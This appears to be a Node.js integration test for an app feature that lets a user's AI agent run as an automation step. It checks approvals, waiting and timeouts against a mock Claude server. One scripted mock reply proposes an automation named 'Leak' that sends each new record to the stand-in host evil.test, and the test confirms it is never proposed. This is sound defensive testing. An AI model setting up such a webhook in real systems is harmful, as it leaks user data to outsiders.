// Flows step 5: one of the maker's agents as an automation step. On the maker's AI key, at the level they set (the
// agent's own approvals apply); told what happened and that an automation asked. With "wait for the answer" the next
// steps go on once it's done, with {answer}; if it takes over 30 minutes they go on without it. What the agent does
// sets no automation off. No AI key: it fails and says so. "Test it" says what it would ask.
import fs from 'node:fs';
import http from 'node:http';
import { spawn } from 'node:child_process';
const S = (await import('node:path')).resolve(process.argv[2] || '.');
const DIR = S + '/dk/flows_agent';
fs.rmSync(DIR, { recursive: true, force: true });
fs.mkdirSync(DIR, { recursive: true });
const PORT = 4980, AI_PORT = 4981, B = `http://127.0.0.1:${PORT}`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let fails = 0;
const ok = (c, msg) => { console.log((c ? 'PASS ' : 'FAIL ') + msg); if (!c) fails++; };
const until = async (f, ms = 10000) => { const end = Date.now() + ms; while (Date.now() < end) { if (await f()) return true; await sleep(120); } return false; };
// A stand-in for Claude: "draft a reply" → a report; "make a task" → a create_task, then a report; "hang" → no answer.
const asked = [];
const text = (c) => (typeof c === 'string' ? c : (c || []).map((b) => b.text || (b.type === 'tool_result' ? b.content : '')).join(' '));
const ai = http.createServer((req, res) => {
  let b = ''; req.on('data', (c) => (b += c)); req.on('end', () => {
    res.setHeader('content-type', 'application/json');
    if (req.url.startsWith('/v1/models')) return res.end(JSON.stringify({ data: [{ id: 'claude-test', display_name: 'Test', type: 'model', created_at: '2026-01-01T00:00:00Z' }], has_more: false }));
    const j = JSON.parse(b);
    const msgs = j.messages;
    const first = text(msgs[0].content);
    asked.push(first);
    const reply = (content, stop = 'end_turn') => res.end(JSON.stringify({ id: 'm', type: 'message', role: 'assistant', model: 'claude-test', content, stop_reason: stop, stop_sequence: null, usage: { input_tokens: 1, output_tokens: 1 } }));
    if (/hang/i.test(first)) return; // never answers
    if (/set up an automation/i.test(first) && msgs.length === 1) return reply([
      { type: 'tool_use', id: 'tu_a', name: 'create_automation', input: { name: 'Done? Bill it', trigger: { kind: 'record.stage', to: 'Done' }, steps: [{ kind: 'invoice', send: true }, { kind: 'wait', amount: 3, unit: 'days' }, { kind: 'task', text: 'Ask {record} for a review', assignee: 'who', dueIn: 0 }], why: 'Jobs sit unbilled' } },
      { type: 'tool_use', id: 'tu_b', name: 'create_automation', input: { name: 'Leak', trigger: { kind: 'record.created' }, steps: [{ kind: 'webhook', url: 'https://evil.test/x' }] } },
      { type: 'tool_use', id: 'tu_c', name: 'create_automation', input: { name: 'Nope', trigger: { kind: 'made.up' }, steps: [{ kind: 'task', text: 'x' }] } },
    ], 'tool_use');
    if (/set up an automation/i.test(first)) return reply([{ type: 'text', text: 'Proposed one automation.' }]);
    if (/make a task/i.test(first) && msgs.length === 1) return reply([{ type: 'tool_use', id: 'tu1', name: 'create_task', input: { text: 'Call the new lead back' } }], 'tool_use');
    const who = /draft a reply for (.+?)\./i.exec(first)?.[1];
    reply([{ type: 'text', text: who ? `Draft for ${who}: Thanks for reaching out!` : 'Done: task made.' }]);
  });
});
await new Promise((r) => ai.listen(AI_PORT, '127.0.0.1', r));
const srv = spawn('node', ['index.js'], { cwd: new URL('../server', import.meta.url).pathname, env: { ...process.env, PORT: String(PORT), PUBLIC_URL: B, DATA_DIR: DIR, MAIL_OUTBOX: '1', RESEND_API_KEY: '', DATABASE_URL: '', STRIPE_SECRET_KEY: '', SKIP_SETUP: '1', ANTHROPIC_BASE_URL: `http://127.0.0.1:${AI_PORT}`, FLOW_TIME_SCALE: '0.002', SCHEDULE_TICK_MS: '150' }, stdio: ['ignore', 'pipe', 'pipe'] });
srv.log = ''; srv.stdout.on('data', (d) => (srv.log += d)); srv.stderr.on('data', (d) => (srv.log += d));
for (let i = 0; i < 100; i++) { try { if ((await fetch(B + '/api/health')).ok) break; } catch {} await sleep(150); }
const call = (tok) => async (m, p, body) => {
  const r = await fetch(B + '/api' + p, { method: m, headers: { 'content-type': 'application/json', ...(tok ? { authorization: 'Bearer ' + tok } : {}) }, body: body ? JSON.stringify(body) : undefined });
  return { status: r.status, body: await r.json().catch(() => null) };
};
const t = Date.now();
try {
  let r = await call()('POST', '/auth', { mode: 'create', workspace: 'Agent ' + t, name: 'Rico Vega', email: `rico${t}@t.test`, password: 'longenough1', device: 'Mac', deviceId: 'd1' });
  const rico = call(r.body.token);
  const st = (await rico('GET', '/state')).body;
  const feed = async (name) => { const w = (await rico('POST', '/channels', { name })).body; return (w.channels || w.workspace?.channels || []).find((c) => c.name === name)?.id; };
  const posts = async (f) => (await rico('GET', '/state')).body.items.filter((x) => x.type === 'message' && x.channelId === f).map((x) => x.text);
  const runsOf = async (name) => (await rico('GET', '/automations')).body.find((x) => x.name === name)?.runs || [];
  const f1 = await feed('answers');

  ok((await rico('POST', '/automations', { name: 'Bad', trigger: { kind: 'contact.created' }, actions: [{ kind: 'agent', agent: 'nobody', ask: 'x' }] })).status === 400, 'an agent that isn’t one is refused');
  ok((await rico('POST', '/automations', { name: 'Bad', trigger: { kind: 'contact.created' }, actions: [{ kind: 'agent', agent: 'sales', ask: '' }] })).status === 400, 'an empty ask is refused');
  r = await rico('POST', '/automations', { name: 'Lead reply', trigger: { kind: 'contact.created' }, actions: [{ kind: 'agent', agent: 'sales', ask: 'Draft a reply for {contact}.', wait: true }, { kind: 'post', text: 'Sales says: {answer}', channelId: f1 }] });
  ok(r.status === 200 && r.body.actions[0].kind === 'agent' && r.body.actions[0].wait === true, 'an automation that asks Sales and waits for the answer is saved');
  const test = (await rico('POST', '/automations/test', { name: 'Lead reply', trigger: { kind: 'contact.created' }, actions: r.body.actions })).body;
  ok(test.steps[0].said === 'Ask Client & Sales Manager: “Draft a reply for Sample customer.”, and wait for the answer ({answer})' || /^Ask .+: “Draft a reply for Sample customer\.”, and wait for the answer/.test(test.steps[0].said), `“Test it” says what it would ask (${test.steps[0].said})`);

  // No AI key: it fails, and says so.
  await rico('POST', '/contacts', { name: 'Ana Lead' });
  ok(await until(async () => { const x = (await runsOf('Lead reply'))[0]; return x && !x.ok && /no AI key/.test(x.note); }), 'without an AI key it fails, and says so');

  // With a key.
  await rico('PUT', '/ai/keys/anthropic', { key: 'sk-ant-test-key-1234567890' });
  await rico('POST', '/contacts', { name: 'Bo Buyer' });
  ok(await until(async () => (await runsOf('Lead reply'))[0]?.note === 'Asked Client & Sales Manager, waiting for the answer · waits for Client & Sales Manager’s answer' || /Asked .+, waiting for the answer/.test((await runsOf('Lead reply'))[0]?.note || '')), 'it asks Sales and waits');
  ok(await until(async () => (await posts(f1)).includes('Sales says: Draft for Bo Buyer: Thanks for reaching out!'), 15000), 'once Sales answers, the next step goes on with {answer}');
  ok(/^After waiting: Got the answer · Posted/.test((await runsOf('Lead reply'))[0]?.note || ''), 'and the log says it got the answer');
  ok(asked.some((q) => q.includes('Draft a reply for Bo Buyer.') && q.includes('Asked by the automation “Lead reply”')), 'the agent was told what happened and that an automation asked');
  const ag = (await rico('GET', '/agents')).body;
  ok(ag.runs.some((x) => x.title.startsWith('Lead reply: Draft a reply for Bo Buyer')), 'the assignment is in Your team, as the maker’s');

  // Not waiting; the agent makes a task, which sets nothing off.
  const f2 = await feed('loops');
  await rico('POST', '/automations', { name: 'Heard task', trigger: { kind: 'task.created' }, actions: [{ kind: 'post', text: 'heard {task}', channelId: f2 }] });
  await rico('POST', '/automations', { name: 'Task it', trigger: { kind: 'contact.created', stage: 'customer' }, actions: [{ kind: 'agent', agent: 'ops', ask: 'Make a task to call {contact}.' }, { kind: 'post', text: 'asked ops about {contact}', channelId: f2 }] });
  await rico('POST', '/contacts', { name: 'Cy Customer', stage: 'customer' });
  ok(await until(async () => (await posts(f2)).includes('asked ops about Cy Customer')), 'not waiting, the next step goes on at once');
  ok(await until(async () => (await rico('GET', '/state')).body.tasks.some((x) => x.text === 'Call the new lead back'), 10000), 'the agent made its task (at the level its maker set)');
  await sleep(500);
  ok(!(await posts(f2)).some((x) => x.startsWith('heard')), 'and the agent’s work set no automation off');

  // An agent that never answers: after 30 minutes it goes on without it.
  await rico('POST', '/automations', { name: 'Slow', trigger: { kind: 'contact.created', stage: 'vendor' }, actions: [{ kind: 'agent', agent: 'chief', ask: 'Hang on {contact}', wait: true }, { kind: 'post', text: 'went on: [{answer}]', channelId: f1 }] });
  await rico('POST', '/contacts', { name: 'Di Vendor', stage: 'vendor' });
  ok(await until(async () => (await posts(f1)).includes('went on: []'), 15000), 'an agent that doesn’t answer in 30 minutes: it goes on without the answer');
  ok(/didn’t answer in 30 minutes/.test((await runsOf('Slow'))[0]?.note || ''), 'and says so');

  // An agent drafts an automation: it waits for a yes, then it's made (on, as built). Never one that sends to an
  // outside address, and never a trigger that doesn't exist.
  r = await rico('POST', '/agents/runs', { agent: 'chief', ask: 'Set up an automation so finished jobs get billed.' });
  const runId = r.body.id || r.body.run?.id;
  let run;
  ok(await until(async () => { run = (await rico('GET', '/agents')).body.runs.find((x) => x.id === runId); return run && !['requested', 'planning', 'running'].includes(run.status); }, 15000), 'the Chief of Staff works on it');
  const stepsOf = (x) => x.parts.flatMap((p) => p.steps);
  const prop = stepsOf(run).find((y) => y.tool === 'create_automation' && y.status === 'proposed');
  ok(!!prop && /^Automation: Done\? Bill it \(A job or record moves to a stage\)$/.test(prop.label), `it proposes the automation and waits for a yes (${prop?.label})`);
  ok(!(await rico('GET', '/automations')).body.some((x) => x.name === 'Done? Bill it'), 'nothing is made before the yes');
  ok(!stepsOf(run).some((y) => y.tool === 'create_automation' && /Leak|Nope/.test(y.label) && ['proposed', 'done'].includes(y.status)), 'one that sends to an outside address, or with a trigger that doesn’t exist, isn’t even proposed');
  r = await rico('POST', `/agents/runs/${runId}/steps`, { do: 'approve', id: prop.id });
  const madeA = (await rico('GET', '/automations')).body.find((x) => x.name === 'Done? Bill it');
  ok(madeA && madeA.on && madeA.trigger.to === 'Done' && madeA.actions.map((y) => y.kind).join() === 'invoice,wait,task' && madeA.actions[0].send === true, 'after the yes it’s made, on, as drafted');
  // Agents switched off.
  await rico('PATCH', '/workspace', { tools: { ...st.workspace.tools, agents: false } });
  ok((await rico('POST', '/automations', { name: 'Off', trigger: { kind: 'contact.created' }, actions: [{ kind: 'agent', agent: 'sales', ask: 'x' }] })).status === 400, 'with Your team switched off, an agent step can’t be added');
} catch (e) {
  console.log('FAIL threw', e.stack);
  fails++;
}
srv.kill();
ai.close();
if (fails) console.log(srv.log.slice(-3000));
console.log(fails ? `${fails} failed` : 'all passed');
process.exit(fails ? 1 : 0);
